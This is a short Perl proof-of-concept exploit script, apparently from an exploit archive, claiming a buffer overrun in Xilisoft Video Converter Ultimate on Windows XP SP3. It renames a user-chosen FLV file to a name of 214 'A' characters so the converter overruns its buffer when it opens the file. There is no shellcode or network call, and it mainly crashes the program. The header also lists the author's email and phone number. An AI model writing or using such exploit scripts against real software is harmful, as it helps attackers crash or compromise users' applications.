#!/usr/bin/perl

###
# Title : Xilisoft Video Converter Ultimate Buffer OverRun
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows
# Impact : Buffer OverRun
# Tested on : Windows XP Sp3 Fr 
# Target :   Xilisoft Video Converter Ultimate
###
# Note : BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
###
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n[*] FLV name [Ex : video] >";
chomp ($song = <STDIN>);
$junk = "\x41" x 214;
# Rename The FLV Video  To Buffer Overrun : 
rename ("$song.flv", "$junk.flv");
print "\n[+] File successfully Rename! \n";
exit;